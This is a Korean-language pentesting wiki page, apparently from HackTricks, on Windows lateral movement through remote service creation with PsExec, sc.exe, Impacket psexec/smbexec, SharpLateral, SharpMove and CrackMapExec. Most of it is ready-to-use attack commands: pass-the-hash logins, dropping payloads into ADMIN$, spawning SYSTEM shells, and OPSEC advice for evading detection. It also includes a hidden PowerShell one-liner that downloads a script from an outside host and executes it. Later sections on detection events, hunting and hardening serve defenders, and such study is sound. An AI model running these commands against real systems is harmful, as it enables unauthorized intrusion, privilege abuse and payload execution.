# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 방식

이러한 기법은 SMB/RPC를 통해 Windows Service Control Manager (SCM)에 원격으로 접근해 명령을 실행합니다. 일반적인 흐름은 다음과 같습니다.

1. 대상에 인증하고 SMB(TCP/445)를 통해 ADMIN$ 공유에 접근합니다.
2. 실행 파일을 복사하거나 서비스가 실행할 LOLBAS 명령줄을 지정합니다.
3. 해당 명령이나 바이너리를 가리키는 서비스를 SCM(MS-SCMR over \PIPE\svcctl)을 통해 원격으로 생성합니다.
4. 서비스를 시작해 payload를 실행하고, 선택적으로 named pipe를 통해 stdin/stdout을 캡처합니다.
5. 서비스를 중지하고 정리합니다(서비스와 드롭한 바이너리 삭제).

요구 사항/사전 조건:
- 대상의 Local Administrator 권한(SeCreateServicePrivilege) 또는 대상에서 명시적인 서비스 생성 권한.
- SMB(445)에 연결할 수 있어야 하고 ADMIN$ 공유를 사용할 수 있어야 합니다. 호스트 방화벽에서 Remote Service Management가 허용되어야 합니다.
- UAC Remote Restrictions: 로컬 계정을 사용하면 토큰 필터링으로 인해 네트워크를 통한 관리자 권한이 차단될 수 있습니다. 단, 기본 제공 Administrator 계정을 사용하거나 LocalAccountTokenFilterPolicy=1로 설정한 경우는 예외입니다.
- Kerberos vs NTLM: hostname/FQDN을 사용하면 Kerberos가 활성화되고, IP로 연결하면 NTLM으로 폴백되는 경우가 많습니다(보안이 강화된 환경에서는 차단될 수 있음).

### sc.exe를 통한 수동 ScExec/WinExec

다음은 최소한의 서비스 생성 방법을 보여줍니다. 서비스 이미지로 드롭한 EXE를 사용하거나 cmd.exe 또는 powershell.exe와 같은 LOLBAS를 사용할 수 있습니다.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

참고:
- 서비스가 아닌 EXE를 시작할 때 타임아웃 오류가 발생할 수 있습니다. 그래도 실행은 진행됩니다.
- OPSEC에 더 유리하도록 fileless 명령어(cmd /c, powershell -enc)를 사용하거나 드롭한 아티팩트를 삭제하는 것이 좋습니다.

더 자세한 단계는 여기에서 확인하세요: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## 도구 및 예시

### Sysinternals PsExec.exe

- SMB를 사용해 ADMIN$에 PSEXESVC.exe를 드롭하고, 임시 서비스(기본 이름은 PSEXESVC)를 설치한 뒤, named pipe를 통해 I/O를 프록시하는 클래식 관리자 도구입니다.
- 사용 예시:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- WebDAV를 통해 Sysinternals Live에서 직접 실행할 수 있습니다:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- 서비스 설치/제거 이벤트를 남기며(서비스 이름은 -r을 사용하지 않는 경우 대개 PSEXESVC), 실행 중 C:\Windows\PSEXESVC.exe를 생성합니다.

### Impacket psexec.py (PsExec 유사 도구)

- RemCom와 유사한 서비스를 내장해 사용합니다. ADMIN$를 통해 일시적인 서비스 바이너리(일반적으로 무작위 이름)를 드롭하고, 서비스를 생성한 다음(기본 이름은 대개 RemComSvc) named pipe를 통해 I/O를 프록시합니다.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

아티팩트
- C:\Windows\에 임시 EXE 파일을 생성합니다(임의의 8자 이름). 별도로 지정하지 않으면 서비스 이름은 RemComSvc입니다.

### Impacket smbexec.py (SMBExec)

- cmd.exe를 실행하는 임시 서비스를 생성하고 I/O에 named pipe를 사용합니다. 일반적으로 전체 EXE payload를 남기지 않으며, 명령 실행은 반대화형입니다.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#)은 service-based exec를 포함한 여러 lateral movement 방식을 구현합니다.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove)에는 명령을 원격으로 실행하기 위한 서비스 수정/생성 기능이 포함되어 있습니다.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- CrackMapExec를 사용해 서로 다른 백엔드(psexec/smbexec/wmiexec)를 통해 실행할 수도 있습니다:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, 탐지 및 아티팩트

PsExec와 유사한 기법을 사용할 때 일반적으로 호스트/네트워크에 남는 아티팩트:
- 대상에서 사용된 관리자 계정에 대해 Security 4624 (Logon Type 3) 및 4672 (Special Privileges) 이벤트가 발생합니다.
- ADMIN$ 접근 및 서비스 바이너리(예: PSEXESVC.exe 또는 임의의 8자 .exe 파일) 생성/쓰기를 보여주는 Security 5140/5145 File Share 및 File Share Detailed 이벤트가 발생합니다.
- 대상에 서비스를 설치할 때 Service Control Manager가 기록하는 **System** 7045 이벤트: PSEXESVC, RemComSvc 또는 사용자 지정 이름(`-r` / `-service-name`) 등이 해당합니다. 이는 서비스가 설치되었음을 입증하지만, 해당 이미지가 실행되었음을 입증하지는 않습니다. 타임스탬프와 이미지 경로를 프로세스 이벤트 또는 일치하는 서비스 이미지 prefetch 항목과 대조하세요(해당 항목이 있는 경우).<sup>[[4]](#references)</sup>
- 서비스 설치를 위한 services.exe 또는 서비스 이미지에 대한 Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ 내 11 (File Create), `\\.\pipe\psexesvc`, `\\.\pipe\remcom_*` 또는 임의로 생성된 이에 상응하는 파이프에 대한 17/18 (Pipe Created/Connected) 이벤트가 발생합니다.
- Sysinternals EULA 관련 레지스트리 아티팩트: 운영자 호스트의 HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (억제되지 않은 경우).

헌팅 아이디어
- ImagePath에 cmd.exe /c, powershell.exe 또는 TEMP 경로가 포함된 서비스 설치를 경고 대상으로 설정합니다.
- ParentImage가 C:\Windows\PSEXESVC.exe인 프로세스 생성 이벤트나, LOCAL SYSTEM으로 실행되며 셸을 실행하는 services.exe의 자식 프로세스를 찾습니다.
- 이름이 -stdin/-stdout/-stderr로 끝나는 파이프 또는 잘 알려진 PsExec 클론 파이프 이름을 표시합니다.

## 일반적인 오류 문제 해결
- 서비스를 생성할 때 Access is denied (5): 실제로 로컬 관리자 권한이 없거나, 로컬 계정에 대한 UAC 원격 제한이 적용되었거나, 서비스 바이너리 경로에 대한 EDR 변조 방지가 작동했을 수 있습니다.
- 네트워크 경로를 찾을 수 없음 (53) 또는 연결할 수 없음: 방화벽이 SMB/RPC를 차단하거나 관리자 공유가 비활성화되었을 수 있습니다.
- Kerberos는 실패하지만 NTLM은 차단됨: 호스트명/FQDN(IP가 아닌)으로 연결하고 적절한 SPN을 확인하거나, Impacket 사용 시 티켓과 함께 -k/-no-pass를 지정합니다.
- 서비스 시작 시간이 초과되었지만 페이로드가 실행됨: 실제 서비스 바이너리가 아닌 경우 예상되는 동작입니다. 출력을 파일로 캡처하거나 실시간 I/O에 smbexec를 사용하세요.

## 강화 참고 사항
- Windows 11 24H2 및 Windows Server 2025에서는 기본적으로 아웃바운드 연결(Windows 11의 경우 인바운드 연결도)에 SMB signing이 필요합니다. 유효한 자격 증명을 사용한 정상적인 PsExec 사용에는 문제가 없지만, 서명되지 않은 SMB relay 악용을 방지하며 signing을 지원하지 않는 장치에는 영향을 줄 수 있습니다.<sup>[[2]](#references)</sup>
- 새로운 SMB 클라이언트 NTLM 차단 기능(Windows 11 24H2/Server 2025)은 IP 주소 또는 Kerberos를 사용하지 않는 서버로 연결할 때 NTLM 대체 인증을 방지할 수 있습니다. 보안이 강화된 환경에서는 NTLM 기반 PsExec/SMBExec가 작동하지 않습니다. Kerberos(호스트명/FQDN)를 사용하거나, 정당한 필요가 있는 경우 예외를 구성하세요.<sup>[[2]](#references)</sup>
- 최소 권한 원칙: 로컬 관리자 구성원을 최소화하고, Just-in-Time/Just-Enough Admin을 우선 적용하며, LAPS를 적용하고, 7045 서비스 설치를 모니터링/경고합니다.

## See also

- WMI 기반 원격 실행(파일을 남기지 않는 경우가 많음):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM 기반 원격 실행:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 및 Windows 11의 SMB 보안 강화](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [자격 증명으로 Windows 시스템 장악하기 - 2부 (PSExec 및 서비스)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – 시스템 이벤트 로그를 사용하여 예기치 않은 재부팅 문제 해결](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
